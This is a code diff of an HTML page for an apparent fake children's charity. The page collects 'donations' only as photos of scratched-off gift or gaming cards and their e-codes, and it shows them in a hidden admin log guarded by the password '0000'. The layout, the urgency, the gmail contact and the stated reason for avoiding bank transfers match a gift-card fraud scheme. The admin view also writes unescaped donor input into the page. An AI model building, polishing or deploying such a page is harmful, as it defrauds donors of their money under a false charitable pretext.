@@ -22,16 +22,18 @@
         label { display: block; margin-bottom: 8px; font-weight: 600; }
         input, select, textarea { width: 100%; padding: 14px; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; }
         .btn-submit { background: var(--accent); color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-size: 1.1rem; cursor: pointer; font-weight: bold; }
+        .method-info { background: #fff4f7; padding: 20px; border-radius: 10px; border: 1px dashed var(--accent); margin-top: 25px; }
         .gratitude-text { font-style: italic; color: #555; border-left: 4px solid var(--accent); padding-left: 15px; margin: 20px 0; }
+        .upload-instruction { background: #f0f7ff; padding: 10px; border-radius: 5px; border-left: 3px solid #2196f3; font-size: 0.85rem; margin-bottom: 10px; color: #0d47a1; }
         #previewContainer { margin-top: 15px; display: none; text-align: center; border: 2px dashed var(--accent); padding: 10px; border-radius: 10px; }
-        #imagePreview { max-width: 100%; border-radius: 8px; }
-        
-        /* Admin Dashboard Styles */
-        #adminPanel { background: white; padding: 20px; border-radius: 12px; border: 2px solid var(--primary); margin-top: 20px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.85rem; }
-        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
-        th { background: var(--primary); color: white; }
-        .admin-img { width: 80px; cursor: pointer; border-radius: 4px; }
+        #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 10px; }
+
+        /* Admin Dashboard UI */
+        #adminSection { background: #fff; padding: 20px; border-radius: 12px; }
+        .admin-card { border: 1px solid #ddd; padding: 15px; border-radius: 10px; margin-bottom: 20px; background: #fdfdfd; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .admin-card img { width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid #eee; }
+        .admin-meta { font-size: 0.85rem; color: #666; margin-bottom: 10px; display: flex; justify-content: space-between; }
+        .badge { background: var(--primary); color: white; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; }
     </style>
 </head>
 <body>
@@ -53,13 +55,39 @@
         <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg" alt="Children Smiling" class="hero-img">
         <div class="content-card">
             <h1>Making the Poor Kids Smile</h1>
-            <p>Welcome to the official platform of our relief fund. We are currently dedicated to the total care of over 500 children.</p>
-            <div class="gratitude-text">"To those who have supported us... we thank you from the bottom of our hearts."</div>
+            <p>Welcome to the official platform of our relief fund. Our mission is built on a single, powerful goal: ensuring that every child under our care has a reason to smile, regardless of the medical or financial challenges they face. We are currently dedicated to the total care of over 500 children, providing them with a foundation of love, health, and security.</p>
+            <h2>A Message of Gratitude</h2>
+            <p>To our existing supporters: Your kindness has been the backbone of this foundation. Because of you, we have been able to provide consistent medical intervention and nutritious meals to children who once had no one to turn to.</p>
+            <div class="gratitude-text">"To those who have supported us, those who continue to stand by us, and those who are considering a donation for the first time—we thank you from the bottom of our hearts. You are not just giving money; you are giving a future."</div>
+            <p>For those looking to join our cause, please know that no act of kindness is too small. Together, we can continue to transform "institutions" into family-style homes where these children can truly thrive.</p>
+        </div>
+        <img src="IMG_20260510_193422.jpg" alt="Our Care Standards" class="hero-img">
+        <div style="text-align: center; padding: 20px;">
+            <p><em>"Join us today & make a difference in a child's life."</em></p>
+            <img src="72c4c4b4bd1513c9e29ca9ebe55776df.jpg" alt="Activities" class="hero-img">
+        </div>
+    </section>
+
+    <section id="about">
+        <h2>Our Mission & Vision</h2>
+        <p>The Happy Madison Children’s Relief Fund specializes in caring for children battling Chronic Pelvic Pain Syndrome (CPPS). This condition requires delicate, ongoing pediatric care and specialized feeding programs.</p>
+        <img src="77316900940097b984b663afdd1321ef.jpg" alt="Our Team" class="hero-img">
+        <p>We operate as a private charitable arm to ensure the safety and anonymity of the families we serve. By focusing on immediate medical intervention and safe housing, we bridge the gap for 500+ children who need us most.</p>
+    </section>
+
+    <section id="support">
+        <h2>Contact Management</h2>
+        <div class="content-card">
+            <p>For all official inquiries regarding our support initiatives, pediatric care, or partnership opportunities, please reach out to our administrative team.</p>
+            <strong>Administration Office Email:</strong><br>
+            <a href="mailto:teammangementt@gmail.com" style="color: var(--accent); text-decoration: none; font-weight: bold;">teammangementt@gmail.com</a>
         </div>
     </section>
 
     <section id="donation">
         <h2>Support Our Children</h2>
+        <p>Direct your support toward the feeding, medicine, and shelter of our children. While your kindness is not compulsory, it is the lifeline that keeps our foundation running.</p>
+        
         <form id="donationForm">
             <div class="form-group">
                 <label>Identify as:</label>
@@ -70,11 +98,11 @@
             </div>
             <div class="form-group" id="nameBox">
                 <label>Your Name:</label>
-                <input type="text" id="donorName" placeholder="Enter name">
+                <input type="text" id="donorName" placeholder="Enter your full name">
             </div>
             <div class="form-group">
                 <label>Amount to Donate ($):</label>
-                <input type="number" id="donorAmount" required>
+                <input type="number" id="donorAmount" placeholder="Amount in USD" required>
             </div>
             <div class="form-group">
                 <label>Select Card Type:</label>
@@ -86,45 +114,51 @@
             </div>
             <div class="form-group">
                 <label>Upload Card Photo:</label>
+                <div class="upload-instruction">
+                    <strong>Instructions:</strong> Please scratch off the silver coating on the back of the card to ensure the code is clearly visible. Then, take a bright, clear photo of the full back of the card and upload it here.
+                </div>
                 <input type="file" id="cardPhotoInput" accept="image/*" onchange="previewLocalImage(event)" required>
-                <div id="previewContainer"><img id="imagePreview" src=""></div>
+                <div id="previewContainer">
+                    <p style="font-size: 0.8rem; color: green; font-weight: bold;">✔ Photo Selected Successfully</p>
+                    <img id="imagePreview" src="">
+                </div>
             </div>
             <div class="form-group">
-                <label>E-Code:</label>
+                <label>E-Code (If available):</label>
                 <input type="text" id="eCode" placeholder="Enter card code">
+            </div>
+            <div class="form-group">
+                <label>Message or Prayer Request:</label>
+                <textarea id="donorMessage" rows="3" placeholder="A word for the children..."></textarea>
             </div>
             <button type="submit" class="btn-submit" id="submitBtn">Submit Donation</button>
         </form>
+
+        <div class="method-info">
+            <strong>Why we use Gift/Gaming Cards for international support:</strong><br><br>
+            To ensure the absolute privacy of the children's homes and to bypass the long delays of international bank transfers, we utilize a <strong>Manual Direct Funding Portal</strong> via verified cards.
+        </div>
+        <img src="b70b664421eebc7302476cdbbb34465c.jpg" alt="The Kids" class="hero-img" style="margin-top:30px;">
     </section>
 
     <section id="adminSection">
-        <h2>Admin Dashboard</h2>
-        <button onclick="clearDonations()" style="background: red; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;">Clear All Logs</button>
-        <div id="adminPanel">
-            <table id="donationTable">
-                <thead>
-                    <tr>
-                        <th>Date</th>
-                        <th>Donor</th>
-                        <th>Amount</th>
-                        <th>Card/Code</th>
-                        <th>Photo</th>
-                    </tr>
-                </thead>
-                <tbody></tbody>
-            </table>
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <h2>Admin Logs</h2>
+            <button onclick="clearLogs()" style="background:#444; color:white; border:none; padding:5px 10px; border-radius:4px; font-size:0.7rem;">Delete All</button>
         </div>
+        <div id="adminLogList">
+            </div>
     </section>
 
     <script>
-        let currentPhotoBase64 = "";
+        let currentBase64 = "";
 
         function previewLocalImage(event) {
             const file = event.target.files[0];
             if (file) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
-                    currentPhotoBase64 = e.target.result;
+                    currentBase64 = e.target.result;
                     document.getElementById('imagePreview').src = e.target.result;
                     document.getElementById('previewContainer').style.display = 'block';
                 }
@@ -132,26 +166,30 @@
             }
         }
 
-        // SAVE TO LOCAL STORAGE
         document.getElementById('donationForm').onsubmit = function(e) {
             e.preventDefault();
-            const donation = {
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.innerText = "Processing...";
+            
+            const newDonation = {
+                id: Date.now(),
                 date: new Date().toLocaleString(),
                 name: document.getElementById('anonStatus').value === 'Anonymous' ? 'Anonymous' : document.getElementById('donorName').value,
                 amount: document.getElementById('donorAmount').value,
-                card: document.getElementById('cardType').value + " / " + document.getElementById('eCode').value,
-                photo: currentPhotoBase64
+                card: document.getElementById('cardType').value,
+                code: document.getElementById('eCode').value,
+                msg: document.getElementById('donorMessage').value,
+                photo: currentBase64
             };
 
-            let logs = JSON.parse(localStorage.getItem('donations') || "[]");
-            logs.push(donation);
-            localStorage.setItem('donations', JSON.stringify(logs));
+            let history = JSON.parse(localStorage.getItem('donations_v2') || "[]");
+            history.unshift(newDonation);
+            localStorage.setItem('donations_v2', JSON.stringify(history));
 
             alert("Thank you! Your donation details have been submitted successfully.");
             location.reload();
         };
 
-        // ADMIN TRIGGER
         let clickCount = 0;
         function adminTrigger() {
             clickCount++;
@@ -159,33 +197,43 @@
                 let pass = prompt("Enter Admin Password:");
                 if (pass === "0000") {
                     showSection('adminSection');
-                    loadAdminData();
+                    renderLogs();
                 } else { alert("Access Denied."); }
                 clickCount = 0;
             }
         }
 
-        function loadAdminData() {
-            const tbody = document.querySelector("#donationTable tbody");
-            tbody.innerHTML = "";
-            let logs = JSON.parse(localStorage.getItem('donations') || "[]");
-            
-            logs.forEach(item => {
-                let row = `<tr>
-                    <td>${item.date}</td>
-                    <td>${item.name}</td>
-                    <td>$${item.amount}</td>
-                    <td>${item.card}</td>
-                    <td><img src="${item.photo}" class="admin-img" onclick="window.open(this.src)"></td>
-                </tr>`;
-                tbody.innerHTML += row;
+        function renderLogs() {
+            const list = document.getElementById('adminLogList');
+            list.innerHTML = "";
+            let history = JSON.parse(localStorage.getItem('donations_v2') || "[]");
+
+            if (history.length === 0) {
+                list.innerHTML = "<p style='text-align:center; color:#999;'>No submissions yet.</p>";
+                return;
+            }
+
+            history.forEach(item => {
+                list.innerHTML += `
+                    <div class="admin-card">
+                        <div class="admin-meta">
+                            <span>${item.date}</span>
+                            <span class="badge">$${item.amount}</span>
+                        </div>
+                        <strong>From:</strong> ${item.name}<br>
+                        <strong>Card:</strong> ${item.card}<br>
+                        <strong>E-Code:</strong> ${item.code || 'None'}<br>
+                        <strong>Message:</strong> ${item.msg || 'No message'}<br>
+                        <img src="${item.photo}" onclick="window.open(this.src)">
+                    </div>
+                `;
             });
         }
 
-        function clearDonations() {
-            if(confirm("Delete all donation history?")) {
-                localStorage.removeItem('donations');
-                loadAdminData();
+        function clearLogs() {
+            if(confirm("Permanently delete all records?")) {
+                localStorage.removeItem('donations_v2');
+                renderLogs();
             }
         }
 
@@ -194,6 +242,7 @@
             document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
             document.getElementById(id).classList.add('active');
             if(document.getElementById('sideMenu').classList.contains('active')) toggleMenu();
+            window.scrollTo(0,0);
         }
         function toggleName() {
             document.getElementById('nameBox').style.display = (document.getElementById('anonStatus').value === 'Anonymous') ? 'none' : 'block';
